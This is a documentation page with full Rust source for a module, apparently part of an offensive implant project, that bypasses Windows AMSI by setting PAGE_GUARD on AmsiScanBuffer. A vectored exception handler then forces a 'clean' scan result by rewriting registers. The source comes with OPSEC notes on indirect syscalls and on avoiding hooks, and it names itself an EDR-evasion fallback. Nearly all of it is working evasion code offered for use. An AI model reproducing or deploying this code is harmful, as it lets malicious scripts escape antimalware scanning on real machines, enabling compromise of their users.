# crowd -- amsi_page_guard.rs

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/amsi_page_guard.rs` |
| **Lines** | 273 |
| **Cards** | T009-edr-evasion |
| **Role** | AMSI PAGE_GUARD bypass |
| **Unsafe blocks** | 4 |

## Purpose

# crowd -- amsi_page_guard.rs

AMSI bypass via PAGE_GUARD exception + Vectored Exception Handler.

## Technique
1. Resolve `AmsiScanBuffer` from `amsi.dll` (PEB walker + PE export table).
2. Register a VEH handler at priority 1 (CALL_FIRST).
3. Set PAGE_GUARD on the memory page containing AmsiScanBuffer via
NtProtectVirtualMemory (RecycledGate -- zero Win32 hooking surface).
4. When the runtime calls AmsiScanBuffer, the CPU raises
STATUS_GUARD_PAGE_VIOLATION (0x80000001).
5. The VEH handler checks if the faulting address falls within
AmsiScanBuffer's page. If yes:
- Sets RAX = 0 (S_OK / AMSI_RESULT_CLEAN)
- Sets RIP to the caller's return address (pops RSP)
- Returns EXCEPTION_CONTINUE_EXECUTION
6. PAGE_GUARD auto-clears on the triggering access (one-shot by design).
Subsequent calls to AmsiScanBuffer execute normally without trapping.
This is sufficient: the first call is the CLR's initialization scan.

## When to use
This is the **fallback** when DR0 is already occupied by another evasion
technique (e.g., KiStepOver HBP chain). The primary path is `amsi_hbp.rs`.

## OPSEC
- No inline hooks (zero byte writes to amsi.dll .text)
- PAGE_GUARD is a documented Windows memory protection attribute
- VEH handler registered/removed cleanly -- no persistent system state
- All NT calls go through RecycledGate (indirect syscall)

## Constants

- `EXCEPTION_GUARD_PAGE`: `u32` = `0x80000001`
- `AMSI_RESULT_CLEAN`: `u64` = `0`
- `PAGE_EXECUTE_READ`: `u32` = `0x20`
- `PAGE_GUARD`: `u32` = `0x100`
- `CURRENT_PROCESS`: `usize` = `(-1isize) as usize`

## Public API

### `install_amsi_page_guard` (line 210)
```rust
pub fn install_amsi_page_guard() -> anyhow::Result<bool>
```
Install PAGE_GUARD bypass on AmsiScanBuffer.

Workflow:
1. Resolve AmsiScanBuffer (PEB walk + PE exports).
2. Register a first-chance VEH handler.
3. Apply PAGE_GUARD | PAGE_EXECUTE_READ to the target page via
NtProtectVirtualMemory (RecycledGate).

Returns:
- `Ok(true)`  -- bypass installed successfully.
- `Ok(false)` -- amsi.dll not loaded / AmsiScanBuffer not found (benign).
- `Err(..)`   -- a required system call failed.

### `remove_amsi_page_guard` (line 265)
```rust
pub fn remove_amsi_page_guard()
```
Remove the VEH handler installed by `install_amsi_page_guard`.

Safe to call even if the bypass was never installed (no-op).
Does NOT restore the original page protection -- PAGE_GUARD is already
auto-cleared after the first access, so the page is in its original state.

## Internal Functions

- `return_address_from_ctx` (unsafe) (line 71)
- `page_guard_veh_handler` (unsafe) — Vectored Exception Handler for PAGE_GUARD interception. (line 88)
- `resolve_amsi_scan_buffer` (unsafe) — Resolve `AmsiScanBuffer` using the PEB walker from `resolve.rs`. (line 147)

## Key Dependencies

- `use winapi::um::errhandlingapi::{AddVectoredExceptionHandler, RemoveVectoredExceptionHandler};`
- `use winapi::um::winnt::{CONTEXT, EXCEPTION_POINTERS, LONG};`
- `use winapi::vc::excpt::{EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH};`

## Full Source

```rust
//! # crowd -- amsi_page_guard.rs
//!
//! AMSI bypass via PAGE_GUARD exception + Vectored Exception Handler.
//!
//! ## Technique
//!   1. Resolve `AmsiScanBuffer` from `amsi.dll` (PEB walker + PE export table).
//!   2. Register a VEH handler at priority 1 (CALL_FIRST).
//!   3. Set PAGE_GUARD on the memory page containing AmsiScanBuffer via
//!      NtProtectVirtualMemory (RecycledGate -- zero Win32 hooking surface).
//!   4. When the runtime calls AmsiScanBuffer, the CPU raises
//!      STATUS_GUARD_PAGE_VIOLATION (0x80000001).
//!   5. The VEH handler checks if the faulting address falls within
//!      AmsiScanBuffer's page. If yes:
//!        - Sets RAX = 0 (S_OK / AMSI_RESULT_CLEAN)
//!        - Sets RIP to the caller's return address (pops RSP)
//!        - Returns EXCEPTION_CONTINUE_EXECUTION
//!   6. PAGE_GUARD auto-clears on the triggering access (one-shot by design).
//!      Subsequent calls to AmsiScanBuffer execute normally without trapping.
//!      This is sufficient: the first call is the CLR's initialization scan.
//!
//! ## When to use
//! This is the **fallback** when DR0 is already occupied by another evasion
//! technique (e.g., KiStepOver HBP chain). The primary path is `amsi_hbp.rs`.
//!
//! ## OPSEC
//! - No inline hooks (zero byte writes to amsi.dll .text)
//! - PAGE_GUARD is a documented Windows memory protection attribute
//! - VEH handler registered/removed cleanly -- no persistent system state
//! - All NT calls go through RecycledGate (indirect syscall)

#![allow(dead_code, non_snake_case)]

use std::ptr::null_mut;
use std::sync::atomic::{AtomicUsize, Ordering};

use std::ffi::c_void;
use winapi::um::errhandlingapi::{AddVectoredExceptionHandler, RemoveVectoredExceptionHandler};
use winapi::um::winnt::{CONTEXT, EXCEPTION_POINTERS, LONG};
use winapi::vc::excpt::{EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH};

// -- Constants ----------------------------------------------------------------

/// STATUS_GUARD_PAGE_VIOLATION -- raised when code/data touches a PAGE_GUARD page.
const EXCEPTION_GUARD_PAGE: u32 = 0x80000001;

/// HRESULT S_OK / AMSI_RESULT_CLEAN -- both are 0.
const AMSI_RESULT_CLEAN: u64 = 0;

/// PAGE_EXECUTE_READ (0x20) -- normal code page protection.
const PAGE_EXECUTE_READ: u32 = 0x20;

/// PAGE_GUARD flag (0x100) -- ORed with base protection.
const PAGE_GUARD: u32 = 0x100;

/// Current-process pseudo-handle for NT APIs.
const CURRENT_PROCESS: usize = (-1isize) as usize;

// -- Global state (set once by install, read by VEH handler) ------------------

/// Address of AmsiScanBuffer. The VEH handler uses this to verify the fault
/// originated from the target function's page.
static AMSI_SCAN_BUFFER_ADDR: AtomicUsize = AtomicUsize::new(0);

/// Handle returned by AddVectoredExceptionHandler, stored for cleanup.
static VEH_HANDLE: AtomicUsize = AtomicUsize::new(0);

// -- ABI helpers (x64 Microsoft calling convention) ---------------------------

/// Read the return address from the top of the stack (RSP points to it).
#[inline(always)]
unsafe fn return_address_from_ctx(ctx: &CONTEXT) -> u64 {
    *(ctx.Rsp as *const u64)
}

// -- VEH handler --------------------------------------------------------------

/// Vectored Exception Handler for PAGE_GUARD interception.
///
/// When AmsiScanBuffer's page is touched, Windows raises EXCEPTION_GUARD_PAGE.
/// We check the faulting address against the stored AmsiScanBuffer address:
///   - If the fault is on the same 4K page: hijack the context to return
///     AMSI_RESULT_CLEAN immediately (RAX=0, RIP=caller, RSP popped).
///   - Otherwise: pass the exception to the next handler.
///
/// PAGE_GUARD is automatically cleared by the CPU on the faulting access,
/// so we do NOT need to re-arm it. One-shot interception is enough for the
/// CLR's AMSI initialization scan.
unsafe extern "system" fn page_guard_veh_handler(
    exception_info: *mut EXCEPTION_POINTERS,
) -> LONG {
    if exception_info.is_null() {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let record = &*(*exception_info).ExceptionRecord;
    let ctx = &mut *(*exception_info).ContextRecord;

    // Only handle EXCEPTION_GUARD_PAGE (STATUS_GUARD_PAGE_VIOLATION).
    if record.ExceptionCode != EXCEPTION_GUARD_PAGE {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let target = AMSI_SCAN_BUFFER_ADDR.load(Ordering::Relaxed);
    if target == 0 {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // Compare at page granularity (4K aligned).
    let fault_page = (record.ExceptionAddress as usize) & !0xFFF;
    let target_page = target & !0xFFF;

    if fault_page != target_page {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // -- Hijack: force a clean return from AmsiScanBuffer --

    // The 6th argument (index 5) of AmsiScanBuffer is `AMSI_RESULT *result`.
    // In x64 Microsoft ABI, arg6 is at [RSP + 0x30] (shadow space + 5th slot).
    // Write AMSI_RESULT_CLEAN into *result if the pointer is accessible.
    let result_ptr_addr = (ctx.Rsp as *const u64).add(6); // [RSP+0x30] after call pushed retaddr
    let result_ptr = *result_ptr_addr as *mut i32;
    if !result_ptr.is_null() {
        // Best-effort write; if the pointer is bad we still clean RAX/RIP.
        core::ptr::write_volatile(result_ptr, AMSI_RESULT_CLEAN as i32);
    }

    // RAX = S_OK (0) -- the HRESULT return value.
    ctx.Rax = AMSI_RESULT_CLEAN;

    // RIP = caller's return address (sitting at [RSP]).
    ctx.Rip = return_address_from_ctx(ctx);

    // Pop the return address off the stack (simulate `ret`).
    ctx.Rsp += core::mem::size_of::<u64>() as u64;

    EXCEPTION_CONTINUE_EXECUTION
}

// -- AmsiScanBuffer resolution ------------------------------------------------

/// Resolve `AmsiScanBuffer` using the PEB walker from `resolve.rs`.
/// Loads `amsi.dll` via `LdrLoadDll` if not already present.
///
/// Returns the raw function pointer, or None if amsi.dll is not available
/// (e.g., non-PowerShell/.NET host process).
unsafe fn resolve_amsi_scan_buffer() -> Option<*mut u8> {
    // Check if amsi.dll is already loaded via PEB InMemoryOrderModuleList walk.
    let mut base = crate::resolve::find_module_base("amsi.dll");

    if base.is_null() {
        // amsi.dll not loaded -- attempt to load via LdrLoadDll (ntdll, no kernel32 surface).
        let ntdll = crate::resolve::ntdll_base_and_name_hashes().0;
        if ntdll.is_null() {
            return None;
        }
        let ldr_load = crate::resolve::resolve_export_by_name(ntdll, "LdrLoadDll");
        if ldr_load.is_null() {
            return None;
        }

        type LdrLoadDllFn = unsafe extern "system" fn(
            *const u16,       // SearchPath
            *mut u32,         // Flags
            *mut [usize; 2],  // ModuleFileName (UNICODE_STRING)
            *mut *const u8,   // BaseAddress out
        ) -> i32;

        let ldr_load: LdrLoadDllFn = core::mem::transmute(ldr_load);

        // UNICODE_STRING for "amsi.dll" -- wide chars, null-terminated.
        let amsi_wide: [u16; 9] = [
            b'a' as u16, b'm' as u16, b's' as u16, b'i' as u16,
            b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
            0,
        ];
        // UNICODE_STRING: Length = 16 bytes (8 chars * 2), MaximumLength = 18 bytes.
        let mut us: [usize; 2] = [16 | (18 << 16), amsi_wide.as_ptr() as usize];
        let mut out_base: *const u8 = null_mut() as _;
        let status = ldr_load(null_mut() as _, null_mut(), &mut us, &mut out_base);
        if status < 0 || out_base.is_null() {
            return None;
        }
        base = out_base;
    }

    // Resolve AmsiScanBuffer from the PE export table.
    let addr = crate::resolve::resolve_export_by_name(base, "AmsiScanBuffer");
    if addr.is_null() {
        None
    } else {
        Some(addr as *mut u8)
    }
}

// -- Public API ---------------------------------------------------------------

/// Install PAGE_GUARD bypass on AmsiScanBuffer.
///
/// Workflow:
///   1. Resolve AmsiScanBuffer (PEB walk + PE exports).
///   2. Register a first-chance VEH handler.
///   3. Apply PAGE_GUARD | PAGE_EXECUTE_READ to the target page via
///      NtProtectVirtualMemory (RecycledGate).
///
/// Returns:
///   - `Ok(true)`  -- bypass installed successfully.
///   - `Ok(false)` -- amsi.dll not loaded / AmsiScanBuffer not found (benign).
///   - `Err(..)`   -- a required system call failed.
pub fn install_amsi_page_guard() -> anyhow::Result<bool> {
    unsafe {
        // -- Step 1: Resolve target address --------------------------------
        let target = match resolve_amsi_scan_buffer() {
            Some(ptr) => ptr,
            None => return Ok(false), // amsi.dll absent -- nothing to bypass
        };

        let target_addr = target as usize;
        AMSI_SCAN_BUFFER_ADDR.store(target_addr, Ordering::Release);

        // -- Step 2: Register VEH handler (CALL_FIRST = 1) -----------------
        let handler = AddVectoredExceptionHandler(1, Some(page_guard_veh_handler));
        if handler.is_null() {
            AMSI_SCAN_BUFFER_ADDR.store(0, Ordering::Release);
            return Err(anyhow::anyhow!(
                "AddVectoredExceptionHandler failed for PAGE_GUARD AMSI bypass"
            ));
        }
        VEH_HANDLE.store(handler as usize, Ordering::Release);

        // -- Step 3: Set PAGE_GUARD on the target's 4K page ----------------
        let page_base = target_addr & !0xFFF;
        let mut guard_base = page_base as *mut c_void;
        let mut guard_size: usize = 0x1000; // single 4K page
        let mut old_protect: u32 = 0;

        let status = crate::recycled::nt_protect_virtual_memory(
            CURRENT_PROCESS,
            &mut guard_base,
            &mut guard_size,
            PAGE_EXECUTE_READ | PAGE_GUARD,
            &mut old_protect,
        );

        if status < 0 {
            // Cleanup: remove the VEH handler we just registered.
            RemoveVectoredExceptionHandler(handler);
            VEH_HANDLE.store(0, Ordering::Release);
            AMSI_SCAN_BUFFER_ADDR.store(0, Ordering::Release);
            return Err(anyhow::anyhow!(
                "NtProtectVirtualMemory PAGE_GUARD failed (NTSTATUS: 0x{:08X})",
                status as u32
            ));
        }

        Ok(true)
    }
}

/// Remove the VEH handler installed by `install_amsi_page_guard`.
///
/// Safe to call even if the bypass was never installed (no-op).
/// Does NOT restore the original page protection -- PAGE_GUARD is already
/// auto-cleared after the first access, so the page is in its original state.
pub fn remove_amsi_page_guard() {
    let handle = VEH_HANDLE.swap(0, Ordering::AcqRel);
    if handle != 0 {
        unsafe {
            RemoveVectoredExceptionHandler(handle as *mut winapi::ctypes::c_void);
        }
    }
    AMSI_SCAN_BUFFER_ADDR.store(0, Ordering::Release);
}

```